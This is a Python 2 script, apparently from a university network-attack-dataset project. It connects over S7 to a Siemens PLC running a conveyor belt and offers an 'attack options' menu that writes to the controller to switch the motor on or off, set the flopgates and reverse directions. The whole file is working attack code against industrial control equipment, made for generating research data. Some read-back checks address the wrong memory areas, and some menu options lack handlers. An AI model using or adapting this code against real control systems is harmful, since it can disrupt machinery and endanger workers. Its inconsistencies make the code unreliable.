#Daniel J. Cowdery
#IFN701 - Network Attack Dataset (Masquerading Attack)

import snap7
import snap7.partner
from snap7.snap7types import*
from snap7.snap7exceptions import*
from snap7.util import*

import time

class ConveyorBelt:
    def __init__(self):
        self.client = snap7.client.Client()
        self.IP = "10.10.10.13"
        self.run = True
        self.option = 99
        self.hexData = [0] * 11
        self.readValue = [0] * 11
        self.changed = False
        self.client.connect(self.IP, 0, 1)
        print "Connected to Conveyor Belt"



    def CheckStatus(self):
        # Read current status
        self.hexData[0] = self.client.read_area(S7AreaPA, 0, 0, 4)  # Motor Run
        self.hexData[1] = self.client.read_area(S7AreaPA, 0, 1, 4)  # Flopgate Right7
        self.hexData[2] = self.client.read_area(S7AreaPA, 0, 2, 4)  # Flopgate Left
        self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
        self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
        self.hexData[5] = self.client.read_area(S7AreaMK, 0, 0, 4)  # HMI Stop
        self.hexData[6] = self.client.read_area(S7AreaMK, 0, 1, 4)  # HMI Start
        self.hexData[7] = self.client.read_area(S7AreaMK, 0, 2, 4)  # HMI Direction
        self.hexData[8] = self.client.read_area(S7AreaMK, 0, 3, 4)  # Flopgate Direction
        self.hexData[9] = self.client.read_area(S7AreaMK, 0, 4, 4)  # Evaluate Object Ons
        self.hexData[10] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Evaluate Object Ons(1)

        # Convert Hexadecimal ByteArray to variables
        self.readValue[0] = snap7.util.get_bool(self.hexData[0], 0, 1)
        self.readValue[1] = snap7.util.get_bool(self.hexData[1], 0, 1)
        self.readValue[2] = snap7.util.get_bool(self.hexData[2], 0, 1)
        self.readValue[3] = snap7.util.get_bool(self.hexData[3], 0, 1)
        self.readValue[4] = snap7.util.get_bool(self.hexData[4], 0, 1)
        self.readValue[5] = snap7.util.get_bool(self.hexData[5], 0, 1)
        self.readValue[6] = snap7.util.get_bool(self.hexData[6], 0, 1)
        self.readValue[7] = snap7.util.get_bool(self.hexData[7], 0, 1)
        self.readValue[8] = snap7.util.get_bool(self.hexData[8], 0, 1)
        self.readValue[9] = snap7.util.get_bool(self.hexData[9], 0, 1)
        self.readValue[10] = snap7.util.get_bool(self.hexData[10], 0, 1)


    def PrintStatus(self):
        print "CONVEYOR STATUS"
        print "Motor Run: ", self.readValue[0]
        print "Flopgate Right: ", self.readValue[1]
        print "Flopgate Left: ", self.readValue[2]
        print "Precense Photoeye: ", self.readValue[3]
        print "Colour Photoeye: ", self.readValue[4]
        print "HMI Stop: ", self.readValue[5]
        print "HMI Start: ", self.readValue[6]
        print "Conveyor Direction: ", self.readValue[7]
        print "Flopgate Direction: ", self.readValue[8]
        print "Evaluate Object Ons: ", self.readValue[9]
        print "Evaluate Object Ons(1): ", self.readValue[10]


    def TEST_PrintDWORDStatus(self):
        # Read current status
        self.hexData[0] = self.client.read_area(S7AreaPA, 0, 0, 4)  # Motor Run
        self.hexData[1] = self.client.read_area(S7AreaPA, 0, 1, 4)  # Flopgate Right7
        self.hexData[2] = self.client.read_area(S7AreaPA, 0, 2, 4)  # Flopgate Left
        self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
        self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
        self.hexData[5] = self.client.read_area(S7AreaMK, 0, 0, 4)  # HMI Stop
        self.hexData[6] = self.client.read_area(S7AreaMK, 0, 1, 4)  # HMI Start
        self.hexData[7] = self.client.read_area(S7AreaMK, 0, 2, 4)  # HMI Direction
        self.hexData[8] = self.client.read_area(S7AreaMK, 0, 3, 4)  # Flopgate Direction
        self.hexData[9] = self.client.read_area(S7AreaMK, 0, 4, 4)  # Evaluate Object Ons
        self.hexData[10] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Evaluate Object Ons(1)

        # Convert Hexadecimal ByteArray to variables
        self.readValue[0] = snap7.util.get_dword(self.hexData[0], 0)
        self.readValue[1] = snap7.util.get_dword(self.hexData[1], 0)
        self.readValue[2] = snap7.util.get_dword(self.hexData[2], 0)
        self.readValue[3] = snap7.util.get_dword(self.hexData[3], 0)
        self.readValue[4] = snap7.util.get_dword(self.hexData[4], 0)
        self.readValue[5] = snap7.util.get_dword(self.hexData[5], 0)
        self.readValue[6] = snap7.util.get_dword(self.hexData[6], 0)
        self.readValue[7] = snap7.util.get_dword(self.hexData[7], 0)
        self.readValue[8] = snap7.util.get_dword(self.hexData[8], 0)
        self.readValue[9] = snap7.util.get_dword(self.hexData[9], 0)
        self.readValue[10] = snap7.util.get_dword(self.hexData[10], 0)

        print "CONVEYOR STATUS"
        print "Motor Run: ", self.readValue[0]
        print "Flopgate Right: ", self.readValue[1]
        print "Flopgate Left: ", self.readValue[2]
        print "Precense Photoeye: ", self.readValue[3]
        print "Colour Photoeye: ", self.readValue[4]
        print "HMI Stop: ", self.readValue[5]
        print "HMI Start: ", self.readValue[6]
        print "Conveyor Direction: ", self.readValue[7]
        print "Flopgate Direction: ", self.readValue[8]
        print "Evaluate Object Ons: ", self.readValue[9]
        print "Evaluate Object Ons(1): ", self.readValue[10]


    def TEST_PrintINTStatus(self):
        # Read current status
        self.hexData[0] = self.client.read_area(S7AreaPA, 0, 0, 4)  # Motor Run
        self.hexData[1] = self.client.read_area(S7AreaPA, 0, 1, 4)  # Flopgate Right7
        self.hexData[2] = self.client.read_area(S7AreaPA, 0, 2, 4)  # Flopgate Left
        self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
        self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
        self.hexData[5] = self.client.read_area(S7AreaMK, 0, 0, 4)  # HMI Stop
        self.hexData[6] = self.client.read_area(S7AreaMK, 0, 1, 4)  # HMI Start
        self.hexData[7] = self.client.read_area(S7AreaMK, 0, 2, 4)  # HMI Direction
        self.hexData[8] = self.client.read_area(S7AreaMK, 0, 3, 4)  # Flopgate Direction
        self.hexData[9] = self.client.read_area(S7AreaMK, 0, 4, 4)  # Evaluate Object Ons
        self.hexData[10] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Evaluate Object Ons(1)

        # Convert Hexadecimal ByteArray to variables
        self.readValue[0] = snap7.util.get_int(self.hexData[0], 0)
        self.readValue[1] = snap7.util.get_int(self.hexData[1], 0)
        self.readValue[2] = snap7.util.get_int(self.hexData[2], 0)
        self.readValue[3] = snap7.util.get_int(self.hexData[3], 0)
        self.readValue[4] = snap7.util.get_int(self.hexData[4], 0)
        self.readValue[5] = snap7.util.get_int(self.hexData[5], 0)
        self.readValue[6] = snap7.util.get_int(self.hexData[6], 0)
        self.readValue[7] = snap7.util.get_int(self.hexData[7], 0)
        self.readValue[8] = snap7.util.get_int(self.hexData[8], 0)
        self.readValue[9] = snap7.util.get_int(self.hexData[9], 0)
        self.readValue[10] = snap7.util.get_int(self.hexData[10], 0)

        print "CONVEYOR STATUS"
        print "Motor Run: ", self.readValue[0]
        print "Flopgate Right: ", self.readValue[1]
        print "Flopgate Left: ", self.readValue[2]
        print "Precense Photoeye: ", self.readValue[3]
        print "Colour Photoeye: ", self.readValue[4]
        print "HMI Stop: ", self.readValue[5]
        print "HMI Start: ", self.readValue[6]
        print "Conveyor Direction: ", self.readValue[7]
        print "Flopgate Direction: ", self.readValue[8]
        print "Evaluate Object Ons: ", self.readValue[9]
        print "Evaluate Object Ons(1): ", self.readValue[10]


    def TEST_PrintREALStatus(self):
        # Read current status
        self.hexData[0] = self.client.read_area(S7AreaPA, 0, 0, 4)  # Motor Run
        self.hexData[1] = self.client.read_area(S7AreaPA, 0, 1, 4)  # Flopgate Right7
        self.hexData[2] = self.client.read_area(S7AreaPA, 0, 2, 4)  # Flopgate Left
        self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
        self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
        self.hexData[5] = self.client.read_area(S7AreaMK, 0, 0, 4)  # HMI Stop
        self.hexData[6] = self.client.read_area(S7AreaMK, 0, 1, 4)  # HMI Start
        self.hexData[7] = self.client.read_area(S7AreaMK, 0, 2, 4)  # HMI Direction
        self.hexData[8] = self.client.read_area(S7AreaMK, 0, 3, 4)  # Flopgate Direction
        self.hexData[9] = self.client.read_area(S7AreaMK, 0, 4, 4)  # Evaluate Object Ons
        self.hexData[10] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Evaluate Object Ons(1)

        # Convert Hexadecimal ByteArray to variables
        self.readValue[0] = snap7.util.get_real(self.hexData[0], 0)
        self.readValue[1] = snap7.util.get_real(self.hexData[1], 0)
        self.readValue[2] = snap7.util.get_real(self.hexData[2], 0)
        self.readValue[3] = snap7.util.get_real(self.hexData[3], 0)
        self.readValue[4] = snap7.util.get_real(self.hexData[4], 0)
        self.readValue[5] = snap7.util.get_real(self.hexData[5], 0)
        self.readValue[6] = snap7.util.get_real(self.hexData[6], 0)
        self.readValue[7] = snap7.util.get_real(self.hexData[7], 0)
        self.readValue[8] = snap7.util.get_real(self.hexData[8], 0)
        self.readValue[9] = snap7.util.get_real(self.hexData[9], 0)
        self.readValue[10] = snap7.util.get_real(self.hexData[10], 0)

        print "CONVEYOR STATUS"
        print "Motor Run: ", self.readValue[0]
        print "Flopgate Right: ", self.readValue[1]
        print "Flopgate Left: ", self.readValue[2]
        print "Precense Photoeye: ", self.readValue[3]
        print "Colour Photoeye: ", self.readValue[4]
        print "HMI Stop: ", self.readValue[5]
        print "HMI Start: ", self.readValue[6]
        print "Conveyor Direction: ", self.readValue[7]
        print "Flopgate Direction: ", self.readValue[8]
        print "Evaluate Object Ons: ", self.readValue[9]
        print "Evaluate Object Ons(1): ", self.readValue[10]


    def PrintOptions(self):
        print "\nATTACK OPTIONS"
        print "0: Toggle Conveyor on / off"
        print "1: Set Flopgate Right"
        print "2: Set Flopgate Left"
        print "3: Toggle Precense Photoeye"
        print "4: Toggle Colour Photoeye"
        print "5: HMI Stop"
        print "6: HMI Start"
        print "7: Toggle Conveyor Direction"
        print "8: Toggle Flopgate Direction"
        print "99: Display System Status"

        try:
            self.option = int(raw_input("\nSelect an action to perform..."))
            self.changed = False
        except ValueError:
            print "Please enter a valid number\n"


    def ToggleMotor(self):
        try:
            while not self.changed:
                if self.readValue[self.option]:             #If motor currently on
                    print "Turning Motor Off..."
                    snap7.util.set_bool(self.hexData[self.option],0,0,False)
                    self.client.write_area(S7AreaPA,0,0,self.hexData[self.option])
                    #time.sleep(1)

                    #Confirm value has been changed
                    self.hexData[self.option] = self.client.read_area(S7AreaPA,0,0,4)
                    self.readValue[self.option] = snap7.util.get_bool(self.hexData[self.option],0,1)
                    if self.readValue[self.option]:
                        self.changed = False
                    else:
                        self.changed = True

                elif not self.readValue[self.option]:                 #If motor currently off
                    print "Turning Motor On..."
                    snap7.util.set_bool(self.hexData[self.option],0,0,True)
                    self.client.write_area(S7AreaPA,0,0,self.hexData[self.option])
                    #time.sleep(1)

                    #Confirm value has been changed
                    self.hexData[self.option] = self.client.read_area(S7AreaPA,0,0,4)
                    self.readValue[self.option] = snap7.util.get_bool(self.hexData[self.option],0,1)
                    if not self.readValue[self.option]:
                        self.changed = False
                    else:
                        self.changed = True

        except KeyboardInterrupt:
            self.Restart()


    def SetFlopgateRight(self):
        try:
            while not self.changed:
                print "Setting Flopgate Right"
                snap7.util.set_bool(self.hexData[self.option],0,0,True)
                self.client.write_area(S7AreaPA,0,1,self.hexData[self.option])

                #Confirm value has been changed
                self.hexData[self.option] = self.client.read_area(S7AreaPA,0,1,4)
                self.readValue[self.option] = snap7.util.get_bool(self.hexData[self.option],0,1)
                if not self.readValue[self.option]:
                    self.changed = False
                else:
                    self.changed = True
        except KeyboardInterrupt:
            self.Restart()


    def SetFlopgateLeft(self):
        try:
            while not self.changed:
                print "Setting Flopgate Left"
                snap7.util.set_bool(self.hexData[self.option],0,0,True)
                self.client.write_area(S7AreaPA,0,2,self.hexData[self.option])

                #Confirm value has been changed
                self.hexData[self.option] = self.client.read_area(S7AreaPA,0,2,4)
                self.readValue[self.option] = snap7.util.get_bool(self.hexData[self.option],0,1)
                if not self.readValue[self.option]:
                    self.changed = False
                else:
                    self.changed = True
        except KeyboardInterrupt:
            self.Restart()


    def ToggleConveyorDirection(self):
        try:
            while not self.changed:
                if self.readValue[self.option]:
                    print "Switching conveyor direction"
                    snap7.util.set_bool(self.hexData[self.option],0,0,False)
                    self.client.write_area(S7AreaMK,0,2,self.hexData[self.option])

                    #Confirm value has been changed
                    self.hexData[self.option] = self.client.read_area(S7AreaPA,0,2,4)
                    self.readValue[self.option] = snap7.util.get_bool(self.hexData[self.option],0,1)
                    if self.readValue[self.option]:
                        self.changed = False
                    else:
                        self.changed = True

                elif not self.readValue[self.option]:
                    print "Re-switching conveyor direction"
                    snap7.util.set_bool(self.hexData[self.option],0,0,True)
                    self.client.write_area(S7AreaMK,0,2,self.hexData[self.option])

                    #Confirm value has been changed
                    self.hexData[self.option] = self.client.read_area(S7AreaPA,0,2,4)
                    self.readValue[self.option] = snap7.util.get_bool(self.hexData[self.option],0,1)
                    if not self.readValue[self.option]:
                        self.changed = False
                    else:
                        self.changed = True

        except KeyboardInterrupt:
            self.Restart()


    def ToggleFlopgateDirection(self):
        try:
            while not self.changed:
                if self.readValue[self.option]:             #If flopgate currently right
                    print "Switching Flopgate Left"
                    snap7.util.set_bool(self.hexData[self.option],0,0,False)
                    self.client.write_area(S7AreaMK,0,3,self.hexData[self.option])
                    #time.sleep(1)

                    #Confirm value has been changed
                    self.hexData[self.option] = self.client.read_area(S7AreaMK,0,3,4)
                    self.readValue[self.option] = snap7.util.get_bool(self.hexData[self.option],0,1)
                    if self.readValue[self.option]:
                        self.changed = False
                    else:
                        self.changed = True

                elif not self.readValue[self.option]:                 #If flopgate currently left
                    print "Switching Flopgate Right"
                    snap7.util.set_bool(self.hexData[self.option],0,0,True)
                    self.client.write_area(S7AreaPA,0,3,self.hexData[self.option])
                    #time.sleep(1)

                    #Confirm value has been changed
                    self.hexData[self.option] = self.client.read_area(S7AreaMK,0,3,4)
                    self.readValue[self.option] = snap7.util.get_bool(self.hexData[self.option],0,1)
                    if not self.readValue[self.option]:
                        self.changed = False
                    else:
                        self.changed = True

        except KeyboardInterrupt:
            self.Restart()


    def Restart(self):
        print "\nResetting connection..."
        self.client.disconnect()
        self.changed = True
        self.option = 99
        self.hexData = [0] * 11
        self.readValue = [0] * 11
        time.sleep(5)
        self.client.connect(self.IP, 0, 1)
        print "Reconnected to conveyor belt\n"


    def Exit(self):
        self.changed = True
        self.run = False
        self.client.disconnect()